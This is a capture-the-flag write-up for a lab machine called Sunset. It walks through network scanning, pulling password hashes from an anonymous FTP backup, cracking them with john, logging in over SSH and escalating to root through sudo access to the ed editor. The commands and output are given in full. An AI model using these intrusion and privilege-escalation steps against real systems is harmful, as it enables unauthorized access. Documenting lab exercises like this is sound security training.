# Sunset

## 1.Enumeration

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:0f	(Unknown: locally administered)
192.168.56.119	08:00:27:d3:ce:c3	PCS Systemtechnik GmbH
192.168.56.100	08:00:27:29:ed:8e	PCS Systemtechnik GmbH
```

The ip address is `192.168.56.119`, let's scan it.


```bash
root@kali: nmap -v -p21,22,80,8080 -sV -sC -oN nmap.out 192.168.56.119

Nmap scan report for 192.168.56.119
Host is up (0.00024s latency).

PORT     STATE  SERVICE    VERSION
21/tcp   open   ftp        pyftpdlib 1.5.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.56.119:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open   ssh        OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 71:bd:fa:c5:8c:88:7c:22:14:c4:20:03:32:36:05:d6 (RSA)
|   256 35:92:8e:16:43:0c:39:88:8e:83:0d:e2:2c:a4:65:91 (ECDSA)
|_  256 45:c5:40:14:49:cf:80:3c:41:4f:bb:22:6c:80:1e:fe (ED25519)
80/tcp   closed http
8080/tcp closed http-proxy
MAC Address: 08:00:27:D3:CE:C3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the only ports are `21` and `22`, so let's check ftp first :

we are able to connect to ftp via user `anonymous` :

```bash
tp 192.168.56.119                                    
Connected to 192.168.56.119.
220 pyftpdlib 1.5.5 ready.
Name (192.168.56.119:root): anonymous
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
229 Entering extended passive mode (|||41299|).
125 Data connection already open. Transfer starting.
-rw-r--r--   1 root     root         1062 Jul 29  2019 backup

ftp> get backup
local: backup remote: backup
229 Entering extended passive mode (|||36815|).
125 Data connection already open. Transfer starting.
100% |******************************************************************************************|  1062      179.86 KiB/s    00:00 ETA
226 Transfer complete.
```

inside backup file we see this 5 hashes, because it is some how not in a good format

i just copied and paste each line in a new file call `user.txt`, the hash type can be identified with `hashid` :

```bash
root@kali: hashid -mj '$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/'

Analyzing '$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/'
[+] SHA-512 Crypt [Hashcat Mode: 1800][JtR Format: sha512crypt]
```

## 2.Gaining Shell

Just use `john` to crack the password :

```bash
root@kali: john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt user.txt 

Using default input encoding: UTF-8
Loaded 5 password hashes with 2 different salts (2.5x same-salt boost) (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
space            (space)     
cheer14          (sunset)     
sky              (sky)  
```


try different users, but you can only login with user `sunset` :

```bash
root@kali: ssh sunset@192.168.56.119
sunset@192.168.56.119's password: 
Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 28 20:52:38 2019 from 192.168.1.182

sunset@sunset:~$ id
uid=1000(sunset) gid=1000(sunset) groups=1000(sunset),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
```

## 3.Privilege Escalation

Check sudo permissions on this user :

```bash
sunset@sunset:~$ sudo -l
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
```

so we can only run `ed` binary with no password :

```bash
unset@sunset:~$ sudo /usr/bin/ed
id
?
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

# cd /root

# cat flag.txt
25d7ce0ee3cbf71efbac61f85d0c14fe
```

This is how you can get root on this machine :)
